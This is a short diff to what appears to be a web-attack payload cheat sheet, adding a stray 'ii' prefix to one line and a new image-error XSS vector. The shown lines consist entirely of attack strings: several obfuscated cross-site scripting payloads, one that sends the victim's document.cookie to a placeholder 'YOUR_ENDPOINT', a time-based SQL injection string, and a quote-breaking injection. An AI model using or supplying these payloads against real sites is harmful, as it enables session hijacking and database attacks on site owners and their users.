@@ -1,4 +1,4 @@
-    <details ontoggle=alert(1337) open>
+ii    <details ontoggle=alert(1337) open>
 "><input autofocus nope="%26quot;x%26quot;"onfocus="frames.location='YOUR_ENDPOINT?c='+Reflect.get(document,'coo'+'kie')">
 next=javascript:top[/al/.source+/ert/.source](document.cookie)
 ');alert(1);//
@@ -53,3 +53,5 @@ SQL injection in search
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNCk+></object>
 
 XOR(if(now()=sysdate(),sleep(5),0))XOR --> also try in user-agent
+
+<img//////src=x oNIY=1 oNerror=alert('xxs')//
